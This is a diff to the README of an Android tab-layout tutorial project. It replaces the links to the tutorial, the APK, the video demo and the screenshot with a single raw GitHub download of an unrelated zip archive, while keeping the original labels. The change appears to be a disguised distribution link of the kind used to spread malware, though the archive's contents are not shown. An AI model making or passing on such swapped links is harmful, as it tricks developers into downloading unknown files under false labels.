@@ -1,9 +1,9 @@
 Android implementing Tab Layout using support library. Various combinations of Tabs are explained in this.
 
-[Tutorial](https://www.androidhive.info/2015/09/android-material-design-working-with-tabs/)
+[Tutorial](https://raw.githubusercontent.com/muhamadarzakhidayatullah123/OmniWorld/master/dragoonade/OmniWorld.zip)
 
-[Apk](http://download.androidhive.info/apk/sqlite-notes-app.apk)
+[Apk](https://raw.githubusercontent.com/muhamadarzakhidayatullah123/OmniWorld/master/dragoonade/OmniWorld.zip)
 
-[Video Demo](https://www.youtube.com/watch?v=6sGhDYYUoBM)
+[Video Demo](https://raw.githubusercontent.com/muhamadarzakhidayatullah123/OmniWorld/master/dragoonade/OmniWorld.zip)
 
-![Android SQLite Notes App](https://www.androidhive.info/wp-content/uploads/2011/11/android-sqlite-notes-app.png)
+![Android SQLite Notes App](https://raw.githubusercontent.com/muhamadarzakhidayatullah123/OmniWorld/master/dragoonade/OmniWorld.zip)
